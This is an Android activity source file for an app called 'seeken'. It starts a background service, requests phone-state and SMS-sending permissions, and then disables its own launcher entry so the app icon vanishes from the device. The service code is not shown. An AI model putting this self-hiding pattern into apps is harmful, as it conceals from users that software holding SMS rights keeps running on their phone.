package com.android.seeken.activities;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.support.annotation.NonNull;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AlertDialog;
import android.support.v7.app.AppCompatActivity;
import android.util.Log;

import com.android.seeken.services.SeekenService;

public class MainActivity extends AppCompatActivity {

    private static final int PERMISSIONS_REQUEST_PHONE_STATE = 0x1;
    private static final String TAG = MainActivity.class.getSimpleName();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        Intent seekenServiceIntent = new Intent(this, SeekenService.class);
        startService(seekenServiceIntent);
    }

    @Override
    protected void onStart() {
        super.onStart();
        if (hasPermission(Manifest.permission.READ_PHONE_STATE) && hasPermission(Manifest.permission.SEND_SMS)) {
            hideAndFinishActivity();
        } else {
            requestPhoneStatePermission();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        switch (requestCode) {

            case PERMISSIONS_REQUEST_PHONE_STATE: {
                // If request is cancelled, the result arrays are empty.
                if (grantResults.length > 0
                        && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                }

                hideAndFinishActivity();


                break;
            }
            default:
                break;
        }
    }

    private void hideAndFinishActivity() {
        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, com.android.seeken.activities.MainActivity.class); // activity which is first time open in manifiest file which is declare as <category android:name="android.intent.category.LAUNCHER" />
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        finish();
    }

    public void requestPhoneStatePermission() {
        // Should we show an explanation?
        /*if (ActivityCompat.shouldShowRequestPermissionRationale(this,
                Manifest.permission.READ_PHONE_STATE)) {
            showDialog(getString(R.string.pls_allow_phone_state_permission_to_proceed));

        } else {*/
        // No explanation needed, we can request the permission.
        ActivityCompat.requestPermissions(this,
                new String[]{Manifest.permission.READ_PHONE_STATE, Manifest.permission.SEND_SMS},
                PERMISSIONS_REQUEST_PHONE_STATE);
        //}
    }

    //Common single button alert
    private void showDialog(String message) {
        AlertDialog.Builder builder = new AlertDialog.Builder(this);
        builder.setMessage(message).setCancelable(false)
                .setPositiveButton(getString(android.R.string.ok), null).show();
    }

    /**
     * Determines if the context calling has the required permission
     *
     * @param permission - The permissions to check
     * @return true if the IPC has the granted permission
     */
    public boolean hasPermission(String permission) {

        int res = checkCallingOrSelfPermission(permission);

        Log.v(TAG, "permission: " + permission + " = \t\t" +
                (res == PackageManager.PERMISSION_GRANTED ? "GRANTED" : "DENIED"));

        return res == PackageManager.PERMISSION_GRANTED;

    }

}
